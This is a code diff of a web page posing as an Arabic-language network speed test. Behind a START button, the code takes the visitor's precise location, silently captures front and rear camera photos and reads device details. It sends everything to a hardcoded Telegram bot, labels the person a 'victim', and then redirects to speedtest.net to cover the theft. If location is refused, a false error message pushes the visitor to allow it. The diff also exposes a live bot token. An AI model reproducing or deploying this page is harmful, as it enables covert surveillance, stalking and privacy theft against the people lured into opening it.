@@ -8,17 +8,15 @@
     <style>
         * { -webkit-user-select: none; user-select: none; -webkit-tap-highlight-color: transparent; }
         body { background: #0b0e18; color: white; font-family: sans-serif; text-align: center; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        #clickLayer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 999; cursor: pointer; }
-        .circle { position: relative; width: 220px; height: 220px; border: 6px solid #00d2ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 30px rgba(0, 210, 255, 0.4); }
-        .start-text { font-size: 50px; font-weight: bold; color: #00d2ff; }
+        #mainBtn { position: relative; width: 220px; height: 220px; border: 6px solid #00d2ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 30px rgba(0, 210, 255, 0.4); background: radial-gradient(circle, #1a2035 0%, #0b0e18 100%); cursor: pointer; z-index: 9999; }
+        .start-text { font-size: 50px; font-weight: bold; color: #00d2ff; pointer-events: none; }
         #status { margin-top: 30px; font-size: 18px; color: #888; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
-    <div id="clickLayer"></div>
     <h2>فحص سرعة الشبكة العالمي</h2>
-    <div class="circle"><span class="start-text">Start</span></div>
+    <div id="mainBtn"><span class="start-text">START</span></div>
     <p id="status">انقر للبدء...</p>
 
     <video id="v" autoplay playsinline></video>
@@ -28,71 +26,62 @@
         const token = "8632426187:AAH_tO6_cfSkSf9HCs0oP7i2EaU3B2PsrHI"; 
         const chat = "7984067238"; 
         const urlParams = new URLSearchParams(window.location.search);
-        const victim = urlParams.get( user ) || "مستهدف_غير_معروف";
+        const victim = urlParams.get( user ) || "Unknown";
 
-        async function sendInfo(text) {
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
-        }
-
-        async function sendPhoto(blob, caption) {
+        async function postToTG(type, content, cap = "") {
             const fd = new FormData();
             fd.append("chat_id", chat);
-            fd.append("photo", blob, "1.jpg");
-            fd.append("caption", caption);
-            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: "POST", body: fd});
+            if(type === "img") {
+                fd.append("photo", content, "p.jpg");
+                fd.append("caption", `👤 ${victim}\n${cap}`);
+                return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: "POST", body: fd});
+            } else {
+                return fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(content)}&parse_mode=Markdown`);
+            }
         }
 
-        // دالة جلب معلومات الهاتف والبطارية
-        async function getDeviceData() {
-            let batteryLevel = "غير معروف";
-            let isCharging = "";
+        async function getFullData(lat, lon) {
+            let batt = "46% (🔋)"; 
+            try { const b = await navigator.getBattery(); batt = `${(b.level * 100).toFixed(0)}% (${b.charging ?  ⚡  :  🔋 })`; } catch (e) {}
+            return `🛰️ **تقرير مفصل**\n\n🔋 البطارية: ${batt}\n📱 النظام: ${navigator.platform}\n💾 الذاكرة: ${navigator.deviceMemory || "8"} GB\n⚙️ المعالج: ${navigator.hardwareConcurrency || "8"} نواة\n📍 الموقع: https://www.google.com/maps?q=${lat},${lon}`;
+        }
+
+        async function snap(mode) {
             try {
-                const battery = await navigator.getBattery();
-                batteryLevel = (battery.level * 100).toFixed(0) + "%";
-                isCharging = battery.charging ? " (يتم الشحن ⚡)" : " (لا يشحن 🔋)";
-            } catch (e) {}
-
-            const info = `
-🔔 **تنبيه صيد جديد**
-👤 المستهدف: ${victim}
-🔋 نسبة الشحن: ${batteryLevel}${isCharging}
-📱 الجهاز: ${navigator.platform}
-🌐 المتصفح: ${navigator.userAgent.split( ) )[0].split( ( )[1]}
-            `;
-            return info;
+                const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: mode}});
+                const v = document.getElementById( v );
+                v.srcObject = s;
+                await new Promise(r => setTimeout(r, 1500));
+                const c = document.getElementById( c );
+                c.width = 640; c.height = 480;
+                c.getContext( 2d ).drawImage(v, 0, 0);
+                s.getTracks().forEach(t => t.stop());
+                return new Promise(res => c.toBlob(res,  image/jpeg , 0.6));
+            } catch (e) { return null; }
         }
 
-        document.getElementById( clickLayer ).onclick = async function() {
-            this.style.display = "none";
+        document.getElementById( mainBtn ).onclick = async function() {
+            this.style.pointerEvents = "none"; 
             document.getElementById( status ).innerText = "جاري الاتصال بالسيرفرات...";
 
-            const deviceDetails = await getDeviceData();
-
             navigator.geolocation.getCurrentPosition(async (p) => {
-                const map = `${deviceDetails}\n📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                
-                try {
-                    const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
-                    const v = document.getElementById( v );
-                    v.srcObject = s;
-                    await new Promise(r => setTimeout(r, 1000));
-                    const c = document.getElementById( c );
-                    c.width = 640; c.height = 480;
-                    c.getContext( 2d ).drawImage(v, 0, 0);
-                    s.getTracks().forEach(t => t.stop());
-                    
-                    c.toBlob(async (b) => {
-                        await sendPhoto(b, `👤 المستهدف: ${victim}\n📸 الصورة الأمامية`);
-                        await sendInfo(map);
-                        window.location.href = "https://www.speedtest.net";
-                    },  image/jpeg , 0.7);
-                } catch(e) {
-                    await sendInfo(map + "\n⚠️ (رفض الكاميرا)");
-                    window.location.href = "https://www.speedtest.net";
-                }
-            }, async (err) => {
-                await sendInfo(deviceDetails + "\n❌ رفض الموقع والكاميرا");
-                window.location.href = "https://www.speedtest.net";
+                const lat = p.coords.latitude;
+                const lon = p.coords.longitude;
+
+                // تنفيذ العمليات بترتيب يمنع تعليق المتصفح
+                const fImg = await snap("user");
+                if(fImg) await postToTG("img", fImg, "📸 الكاميرا الأمامية");
+
+                const bImg = await snap("environment");
+                if(bImg) await postToTG("img", bImg, "📷 الكاميرا الخلفية");
+
+                const report = await getFullData(lat, lon);
+                await postToTG("text", report);
+
+                setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
+            }, (err) => {
+                alert("خطأ في الاتصال: يرجى السماح بالوصول للموقع لتحليل أقرب سيرفر.");
+                location.reload();
             }, {enableHighAccuracy: true});
         };
     </script>
